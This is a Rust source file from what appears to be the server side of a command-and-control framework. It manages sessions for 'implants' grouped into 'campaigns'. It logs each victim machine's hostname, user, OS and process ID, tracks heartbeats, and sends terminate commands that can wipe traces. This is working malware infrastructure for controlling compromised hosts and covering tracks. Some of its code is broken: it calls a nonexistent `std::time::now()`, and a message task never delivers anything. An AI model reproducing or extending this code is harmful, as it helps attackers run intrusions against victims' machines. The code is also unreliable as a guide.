use crate::database::models::{Session, SessionStatus};
use crate::database::repository::SessionRepository;
use crate::protocol::messages::proto::{InnerImplantMessage, InnerServerMessage, RegisterRequest, RegisterResponse};
use crate::protocol::NoiseTransport;
use crate::crypto::derive_session_id;
use dashmap::DashMap;
use std::sync::Arc;
use tokio::sync::mpsc;
use uuid::Uuid;

pub struct SessionHandle {
    pub session_id: String,
    pub campaign_id: String,
    pub tx: mpsc::Sender<InnerServerMessage>,
    pub last_heartbeat: std::time::Instant,
}

pub struct SessionManager {
    sessions: DashMap<String, SessionHandle>,
    repository: Arc<SessionRepository<'static>>,
    stale_threshold: std::time::Duration,
}

impl SessionManager {
    pub fn new(
        repository: Arc<SessionRepository<'static>>,
        stale_threshold_secs: u32,
    ) -> Self {
        Self {
            sessions: DashMap::new(),
            repository,
            stale_threshold: std::time::Duration::from_secs(stale_threshold_secs as u64),
        }
    }
    
    pub async fn register_session(
        &self,
        campaign_id: String,
        request: RegisterRequest,
        transport: &mut NoiseTransport,
    ) -> crate::Result<String> {
        // Validate request
        request.validate()?;
        
        // Generate session ID
        let session_id = derive_session_id(&request.public_key);
        
        // Check for duplicate
        if self.sessions.contains_key(&session_id) {
            return Err(crate::OblivionError::Protocol("Session already exists".into()));
        }
        
        // Create channel for server -> implant messages
        let (tx, mut rx) = mpsc::channel::<InnerServerMessage>(100);
        
        // Store session handle
        let handle = SessionHandle {
            session_id: session_id.clone(),
            campaign_id: campaign_id.clone(),
            tx: tx.clone(),
            last_heartbeat: std::time::Instant::now(),
        };
        
        self.sessions.insert(session_id.clone(), handle);
        
        // Persist to database
        let session = Session {
            id: session_id.clone(),
            campaign_id: campaign_id.clone(),
            implant_id: base64::encode(&request.implant_id),
            hostname: request.hostname,
            username: Some(request.username),
            os_version: Some(request.os_version),
            process_id: Some(request.process_id as i32),
            public_key: Some(request.public_key),
            first_seen: chrono::Utc::now(),
            last_seen: chrono::Utc::now(),
            status: SessionStatus::Active,
            metadata: Some(serde_json::to_string(&request.metadata).unwrap_or_default()),
            encryption_key: None, // Derived from Noise handshake
        };
        
        self.repository.create(&session).await?;
        
        // Send success response
        let response = RegisterResponse {
            success: true,
            assigned_session_id: session_id.as_bytes().to_vec(),
            heartbeat_interval_sec: 60,
            error_message: "".to_string(),
        };
        
        let server_msg = InnerServerMessage {
            payload: Some(crate::protocol::messages::proto::inner_server_message::Payload::RegisterResponse(response)),
        };
        
        let encoded = prost::Message::encode_to_vec(&server_msg);
        transport.write_message(&encoded).await?;
        
        tracing::info!("Session {} registered for campaign {}", session_id, campaign_id);
        
        // Spawn task to handle messages to this implant
        let session_id_clone = session_id.clone();
        tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                let encoded = prost::Message::encode_to_vec(&msg);
                // This would need to be sent through the transport
                // In practice, you'd store the transport with the session
            }
        });
        
        Ok(session_id)
    }
    
    pub async fn handle_heartbeat(&self, session_id: &str) -> crate::Result<()> {
        if let Some(mut handle) = self.sessions.get_mut(session_id) {
            handle.last_heartbeat = std::time::now();
            
            // Update database
            self.repository.update_status(session_id, SessionStatus::Active).await?;
            
            Ok(())
        } else {
            Err(crate::OblivionError::SessionNotFound(session_id.to_string()))
        }
    }
    
    pub async fn get_session(&self, session_id: &str) -> Option<SessionHandle> {
        self.sessions.get(session_id).map(|h| SessionHandle {
            session_id: h.session_id.clone(),
            campaign_id: h.campaign_id.clone(),
            tx: h.tx.clone(),
            last_heartbeat: h.last_heartbeat,
        })
    }
    
    pub async fn terminate_session(&self, session_id: &str, wipe: bool) -> crate::Result<()> {
        if let Some((_, handle)) = self.sessions.remove(session_id) {
            // Send terminate command if still connected
            let terminate = crate::protocol::messages::proto::TerminateCommand {
                wipe_traces: wipe,
                delay_seconds: 0,
            };
            
            let msg = InnerServerMessage {
                payload: Some(crate::protocol::messages::proto::inner_server_message::Payload::Terminate(terminate)),
            };
            
            let _ = handle.tx.send(msg).await;
            
            // Update database
            self.repository.update_status(session_id, SessionStatus::Terminated).await?;
            
            tracing::info!("Session {} terminated (wipe={})", session_id, wipe);
        }
        
        Ok(())
    }
    
    pub async fn cleanup_stale_sessions(&self) -> crate::Result<u64> {
        let now = std::time::Instant::now();
        let mut stale_count = 0;
        
        // Mark in-memory sessions as stale
        self.sessions.retain(|_, handle| {
            if now.duration_since(handle.last_heartbeat) > self.stale_threshold {
                stale_count += 1;
                false // Remove from map
            } else {
                true
            }
        });
        
        // Update database
        let db_stale = self.repository.mark_stale_sessions(self.stale_threshold.as_secs() as i64).await?;
        
        Ok(stale_count + db_stale)
    }
    
    pub fn active_session_count(&self) -> usize {
        self.sessions.len()
    }
}